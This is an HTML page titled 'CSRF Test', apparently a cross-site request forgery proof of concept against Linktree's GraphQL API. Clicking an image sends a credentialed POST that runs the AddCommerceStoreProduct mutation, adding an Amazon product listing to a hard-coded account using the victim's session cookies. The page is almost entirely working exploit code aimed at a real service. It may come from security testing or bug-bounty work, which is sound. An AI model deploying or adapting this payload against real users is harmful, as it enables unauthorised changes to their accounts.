<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Test</title>
    <script>
        function handleClick() {
            fetch('https://graph.linktr.ee/graphql', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                credentials: 'include', // Include cookies and headers
                body: JSON.stringify({
                    operationName: "AddCommerceStoreProduct",
                    variables: {
                        input: {
                            currency: "USD",
                            image: "https://m.media-amazon.com/images/I/61QDpuwkO3L.__AC_SX300_SY300_QL70_FMwebp_.jpg",
                            price: 699,
                            title: "Amazon.com: SCIONE Fidget Spinner Toy 1 Pack",
                            vendor: "amazon.com",
                            priceVisible: true,
                            url: "https://www.amazon.com/dp/B0D3KQZFD1",
                            position: 0,
                            accountUuid: "e98e94ec-eeff-43fc-9530-4defb8e6cb55",
                            active: true,
                            addedStandalone: true
                        }
                    },
                    query: "mutation AddCommerceStoreProduct($input: AddCommerceStoreProductInput!) { addCommerceStoreProduct(input: $input) { id } }"
                })
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error('Error:', error));
        }
    </script>
</head>
<body>
    <!-- Clickable image -->
    <a href="#" onclick="handleClick();">
        <img src="https://your-image-url.com/image.jpg" alt="Click me">
    </a>
</body>
</html>
